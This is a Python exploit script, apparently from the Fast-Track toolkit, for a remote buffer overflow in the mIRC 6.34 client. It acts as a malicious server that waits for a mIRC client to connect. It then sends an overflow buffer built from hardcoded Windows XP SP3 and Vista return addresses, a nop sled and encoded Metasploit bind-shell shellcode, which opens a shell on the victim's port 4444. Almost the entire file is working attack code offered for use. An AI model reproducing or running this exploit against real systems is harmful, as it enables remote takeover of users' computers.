#!/usr/bin/env python

from socket import *
import subprocess
import os
import sys
import time
#from bin.include import print_banner

#print_banner()

print """
    mIRC 6.34 Remote Buffer Overflow Exploit
    Original Exploit by SkD (skdrat <at> hotmail <.> com)
    Rewritten by: ReL1K for Fast-Track (perl to python convert)

    Credits to securfrog for publishing the PoC.\n"""
port=raw_input("\n    What port do you want to listen on: ")
target=raw_input("""    Choose the operating system version:

    1. XP Service Pack 3
    2. Vista

    <ctrl>-c to Cancel
	
    Enter choice: """)

# win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=ShikataGaNai http://metasploit.com restricted chars 0x00 0xff
shellcode=("\x29\xc9\xb1\x51\xbe\x0e\x06\x17\x06\xda\xdf\xd9\x74\x24\xf4\x5f"
"\x31\x77\x0e\x03\x77\x0e\x83\xe1\xfa\xf5\xf3\x01\x68\x11\xb6\x11"
"\x94\x1a\xb6\x1e\x07\x6e\x25\xc4\xec\xfb\xf3\x38\x66\x87\xfe\x38"
"\x79\x97\x8a\xf7\x61\xec\xd2\x27\x93\x19\xa5\xac\xa7\x56\x37\x5c"
"\xf6\xa8\xa1\x0c\x7d\xe8\xa6\x4b\xbf\x23\x4b\x52\xfd\x5f\xa0\x6f"
"\x55\x84\x61\xfa\xb0\x4f\x2e\x20\x3a\xbb\xb7\xa3\x30\x70\xb3\xec"
"\x54\x87\x28\x11\x49\x0c\x27\x79\xb5\x0e\x59\x42\x84\xf5\xfd\xcf"
"\xa4\x39\x75\x8f\x26\xb1\xf9\x13\x9a\x4e\xb9\x23\xba\x38\xb4\x7d"
"\x4c\x55\x98\x7e\x86\xc3\x4a\xe6\x4f\x3f\x5f\x8e\xf8\x4c\xad\x11"
"\x53\x4c\x01\xc5\x90\x5f\x5e\x2e\x77\x5f\x49\x0f\xfe\x7a\x10\x2e"
"\xed\x8d\xdf\x65\x84\x8f\x20\x55\x30\x49\xd7\xa0\x6c\x3e\x17\x9c"
"\x3c\x92\xb4\x73\x90\x57\x68\x30\x45\xa7\x5e\xd0\x01\x46\x03\x7a"
"\x81\xe1\x5a\x17\x4d\x56\x86\x67\x49\xc1\x48\x51\x3f\xfe\xe7\x08"
"\x3f\x2e\x6f\x16\x12\xe1\x99\x01\x92\x28\x0a\xf8\x93\x05\xc5\xe7"
"\x25\x20\x5f\xb0\x4a\xfa\x30\x6a\xe1\x56\x4e\x42\x9a\x31\x57\x1b"
"\x5b\xb8\xc0\x24\xb5\x6e\x10\x0a\x5c\xfb\x8a\xcc\xc9\x98\x3f\x99"
"\xef\x35\x90\xc0\xc6\x05\x99\x15\x72\xd2\x13\x3b\xb2\x1a\xd0\x11"
"\x4b\xd8\x3a\x9b\xf6\xf1\xd7\xee\x8d\x31\x73\x5b\xda\x2a\xf1\x65"
"\xae\xbd\x0a\xec\x95\x3e\x22\x55\x41\x93\x9a\x38\x3c\x79\x1c\xeb"
"\xef\x28\x4f\xf4\xc0\xbb\xc2\xd3\xe4\xf5\x4e\x1c\x30\x63\x8e\x1d"
"\x8a\x8b\xa0\x6a\xa2\x8f\xc2\xa8\x29\x8f\x13\x62\x4d\xbf\xf4\x72"
"\x3b\x44\x5a\x21\xc3\x93\x9b\x15")
overflow = "\x41"*307
overflow2 = "B"*12
eip_vista = "\x66\x1c\xc2\x76"    #Normaliz.DLL pop pop ret
eip2_vista = "\xd3\xdb\x54\x77"   #MSFCT.DLL jmp esp
eip_xpsp3 = "\xd1\xfb\x92\x77"    #SETUPAPI.DLL 0x7792FBD1 pop eax pop ret
eip2_xpsp3 = "\xb7\x87\x9d\x77"   #SETUPAPI.DLL 0x779D87B7 jmp esp
addr = "\xb5\xb5\xfd\x7f" 
nop_sled = "\x90"*4
jmp = "\xEB\x03\xFF\xFF"

if target=='1':
   evil=overflow+eip_xpsp3+addr+nop_sled+eip2_xpsp3+nop_sled+overflow2+jmp+nop_sled+shellcode+nop_sled
if target=='2':
   evil=overflow+eip_vista+addr+nop_sled+eip2_vista+nop_sled+overflow2+jmp+nop_sled+shellcode+nop_sled
s = socket(AF_INET, SOCK_STREAM)
s.bind(("0.0.0.0", int(port)))
s.listen(1)
print "\n[+] Listening on port %s" % (port)
c, addr = s.accept()
print "[+] Connection accepted from: %s" % (addr[0])
c.recv(1024)
c.send(evil)
print "\n    Our payload has been sent...connect to the IP Address on port 4444\n"
raw_input("[+] Done, press enter to quit\n\n")
c.close()
s.close()
